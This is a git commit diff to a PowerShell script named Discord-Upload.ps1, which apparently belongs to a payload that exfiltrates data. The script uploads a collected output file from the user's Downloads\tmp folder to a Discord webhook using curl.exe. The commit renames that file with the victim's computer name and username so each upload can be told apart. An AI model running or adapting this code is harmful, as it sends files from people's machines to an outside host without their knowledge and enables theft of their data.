5c7c1b826f06584b579aea95bdfdfb8f5c982d8e
QuackBeans <84631177+QuackBeans@users.noreply.github.com>
2024-02-26 14:28:55 +1000

    Update Discord-Upload.ps1

--- Discord-Upload.ps1
+++ Discord-Upload.ps1
@@ -21,4 +21,15 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Discord-Upload -file "C:\Users\$env:UserName\Downloads\tmp\output.txt"}
+if (-not ([string]::IsNullOrEmpty($dc))){
+    # Get the computer name and current username
+    $computerName = $env:COMPUTERNAME
+    $currentUserName = $env:USERNAME
+
+    # Construct the output file name
+    $outputFileName = "${computerName}_${currentUserName}_output.txt"
+
+    # Call the Discord-Upload function with the dynamically named output file
+    Discord-Upload -file "C:\Users\$env:UserName\Downloads\tmp\$outputFileName"
+}
+
